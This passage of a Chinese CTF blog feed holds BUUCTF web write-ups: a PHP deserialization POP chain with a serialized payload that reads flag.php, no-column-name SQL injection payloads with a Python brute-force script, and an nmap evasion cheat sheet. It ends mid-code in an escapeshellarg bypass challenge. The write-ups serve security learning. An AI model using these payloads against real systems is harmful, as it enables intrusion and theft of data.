class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;<span class="comment">//被当作函数调用时触发include(modifier-&gt;var)</span></span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;including&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//利用伪协议读取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//modifier被当作函数调用时触发</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;invodeing&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;tostring&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span> (<span class="variable language_">$this</span>-&gt;str-&gt;source);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;<span class="comment">//这里可以构造触发Test类的__get</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;wakeup&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable language_">$this</span>-&gt;source)) &#123;<span class="comment">//这里source如果是class则会触发tostring</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//访问没有的属性触发</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;getting&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;<span class="comment">//p=modifier</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用逻辑"><a href="#利用逻辑" class="headerlink" title="利用逻辑"></a>利用逻辑</h3><p>最终目的为触发include，如何触发？触发Modifier中的__invoke，也就是要以函数方式引用该类，也就是让Test类里面的p为一个Modifier类，那么就要触发Test类里面的__get，也就是要引用一个Test类里面没有属性。到此好像逻辑断了，不急看下面。</p><p>那么如何触发Show里面的__tostring，那就要使用Show里面的__wakeup里面preg_match以this-&gt;source为字符串，也就是this-&gt;source为一个Show类，即使用show1-&gt;source&#x3D;show2 来触发。而__tostring恰好为引用show2-&gt;str-&gt;source，假如str是Test类呢，source又不是Test的属性，进而和上面的逻辑连上了，进而多层pop触发include。逻辑图如下。</p><p><img src="/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/2022-04-23-18-49-11.png"></p><h3 id="private-protected反序列化tips"><a href="#private-protected反序列化tips" class="headerlink" title="private protected反序列化tips"></a>private protected反序列化tips</h3><p>private属性序列化的时候格式是%00类名%00成员名<br>protect属性序列化的时候格式是%00*%00成员名<br>public&#x2F;var 不变<br>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);  <span class="comment">//  O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"> O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>的参数被反序列化后变成 \<span class="number">00</span>test\<span class="number">00</span>test1</span><br><span class="line"><span class="keyword">public</span>的参数变成 test2 </span><br><span class="line"><span class="keyword">protected</span>的参数变成 \<span class="number">00</span>*\<span class="number">00</span>test3</span><br><span class="line">（在url中\<span class="number">00</span>换成%<span class="number">00</span>）</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为var为protected性质，所以这里要将*var改成%00*%00var</span></span><br><span class="line">?pop=O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;%00*%00var&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>php脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;<span class="comment">//被当作函数调用时触发include(modifier-&gt;var)</span></span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show1</span>=<span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$show2</span>=<span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$mod</span> =<span class="keyword">new</span> Modifier;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$show1</span>-&gt;source=<span class="variable">$show2</span>;</span><br><span class="line"><span class="variable">$show2</span>-&gt;str=<span class="variable">$test</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;p=<span class="variable">$mod</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$show1</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blackdn.github.io/2020/04/04/CTF-File-Inclusion-2020/">CTF-文件包含漏洞</a><br><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇</a><br><a href="https://xz.aliyun.com/t/6753">一文让PHP反序列化从入门到进阶</a><br><a href="https://xz.aliyun.com/t/6454#toc-3">PHP反序列化进阶学习与总结</a><br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">php魔法函数</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[SWPU2019]Web1-无列名sql注入</title>
      <link href="/2022/04/22/BUUCTF-WEB-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8Dsql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/04/22/BUUCTF-WEB-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8Dsql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="无列名sql注入基本逻辑"><a href="#无列名sql注入基本逻辑" class="headerlink" title="无列名sql注入基本逻辑"></a>无列名sql注入基本逻辑</h2><p>获得临时表，并对列进行重命名，查询新列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin;获得一个临时表，内容同admin，但是列名为<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a;从临时表读取 名为 <span class="number">3</span> 的列</span><br><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a;假如反引号被过滤，可以使用<span class="keyword">as</span>重命名</span><br><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a;也可以直接使用字符串重命名</span><br></pre></td></tr></table></figure><h2 id="bapass-过滤information"><a href="#bapass-过滤information" class="headerlink" title="bapass 过滤information"></a>bapass 过滤information</h2><p>由于我们可以无列名注入了，所以只需要表名即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats </span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这里经测试发现有xss，还以为是xss，然后在看广告详情的时候，发现有sql注入</p><h3 id="爆列数"><a href="#爆列数" class="headerlink" title="爆列数"></a>爆列数</h3><ol><li>group by,因为order by被过滤<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/group/**/by/**/22,&#x27;</span><span class="number">3</span></span><br><span class="line">解释</span><br><span class="line">因为注释被过滤，所以用 ,<span class="string">&#x27;3 闭合结尾</span></span><br></pre></td></tr></table></figure></li><li>使用union 强力破解<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47f9257d-64f3-40c2-967d-ec64b2aec934.node4.buuoj.cn:81/addads.php&#x27;</span></span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&#x27;</span>,</span><br><span class="line">    <span class="comment">#&#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,</span></span><br><span class="line">    <span class="comment">#&#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span></span><br><span class="line">    <span class="comment">#&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line">    <span class="comment">#&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span></span><br><span class="line"><span class="comment">#&#x27;Origin&#x27;: &#x27;http://9338dcc6-8138-452b-a271-667da813b1c7.node4.buuoj.cn:81&#x27;,</span></span><br><span class="line">    <span class="comment">#&#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span></span><br><span class="line">    <span class="comment">#&#x27;Referer&#x27;: &#x27;http://9338dcc6-8138-452b-a271-667da813b1c7.node4.buuoj.cn:81/addads.php&#x27;,</span></span><br><span class="line"><span class="comment">#&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;4c5b82682c782d7ff95ed2bd5ac8a1f6&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    s+=<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    body=&#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>:<span class="string">&quot;-1&#x27;/**/union/**/select/**/%s&#x27;a&quot;</span>%(s),</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;111&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ac&#x27;</span>:<span class="string">&#x27;add&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(body)</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>)&gt;=<span class="number">20</span>:<span class="comment">#根据可申请量更改</span></span><br><span class="line">        r=requests.post(url=url, headers=header,cookies=cookies,data=body,proxies=proxy)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="comment">#print(body)   </span></span><br></pre></td></tr></table></figure><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3>根据前面的bypass<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span>a</span><br></pre></td></tr></table></figure><h3 id="无列名爆数据"><a href="#无列名爆数据" class="headerlink" title="无列名爆数据"></a>无列名爆数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b/**/union/**/select*from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span>a</span><br></pre></td></tr></table></figure>那么，有就会问了，为什么单单选users呢？因为她好看。逃。<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a><br><a href="https://blog.csdn.net/SopRomeo/article/details/104783528">buuctf [SWPU2019]Web1 记录</a><br><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB [BUUCTF 2018]Online Tool&amp;[网鼎杯 2020 朱雀组]Nmap 绕过escapeshell</title>
      <link href="/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/"/>
      <url>/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/</url>
      
        <content type="html"><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ol><li>绕过escapeshell</li><li>过滤关键字 php</li><li>nmap写入文件<h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nmap -v <span class="number">127.0</span>.<span class="number">0.1</span>给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line">nmap -iL nmaptest.txt 运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line">nmap <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span>使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line">nmap -A <span class="number">192.168</span>.<span class="number">0.101</span>启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line">nmap -O <span class="number">127.0</span>.<span class="number">0.1</span>使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line">nmap -sA <span class="number">192.168</span>.<span class="number">0.101</span>扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">nmap -PN <span class="number">192.168</span>.<span class="number">0.101</span>扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line">nmap -sP <span class="number">192.168</span>.<span class="number">0</span>.*找出网络中的在线主机</span><br><span class="line">nmap -F <span class="number">192.168</span>.<span class="number">0.101</span>快速扫描，仅扫描nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line">nmap -f <span class="number">192.168</span>.<span class="number">96.4</span>使用小数据包发送，避免被识别出</span><br><span class="line">nmap -r <span class="number">192.168</span>.<span class="number">0.101</span>不会随机的选择端口扫描</span><br><span class="line">nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span>.<span class="number">0.101</span>使用“-P”选项指定你想要扫描的端口</span><br><span class="line">nmap -sV <span class="number">192.168</span>.<span class="number">0.101</span>查找主机服务版本号</span><br><span class="line">nmap -PS <span class="number">192.168</span>.<span class="number">0.101</span>使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line">nmap -Pn <span class="number">192.168</span>.<span class="number">96.4</span>  目标机禁用ping，绕过ping扫描</span><br><span class="line">nmap -sn <span class="number">192.168</span>.<span class="number">96.4</span>对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line">nmap -sS <span class="number">192.168</span>.<span class="number">0.101</span>执行一次隐蔽的扫描，安全，快</span><br><span class="line">nmap -sT <span class="number">192.168</span>.<span class="number">0.101</span>使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line">nmap -sN <span class="number">192.168</span>.<span class="number">0.101</span>执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sI 僵尸ip 目标ip使用僵尸机对目标机发送数据包</span><br><span class="line">nmap <span class="number">192.168</span>.<span class="number">96.4</span> -oX myscan.xml对扫描结果另存在myscan.xml</span><br><span class="line">nmap -T1~<span class="number">6</span> <span class="number">192.168</span>.<span class="number">96.4</span>设置扫描速度，一般T4足够</span><br><span class="line">nmap –mtu &lt;size&gt; <span class="number">192.168</span>.<span class="number">96.4</span>发送的包大小,最大传输单元必须是<span class="number">8</span>的整数</span><br><span class="line">nmap -D &lt;假ip&gt; <span class="number">192.168</span>.<span class="number">96.4</span>发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">nmap –oG <span class="number">1</span>.txt –v <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span>-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">Nmap –resume <span class="number">1</span>.txt作用：继续扫描</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>nmap保存文件参数</p><p><img src="/2022/04/22/BUUCTF-WEB-BUUCTF-2018-Online-Tool-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap-%E7%BB%95%E8%BF%87escapeshell/2022-04-22-14-57-55.png"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>打开链接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] 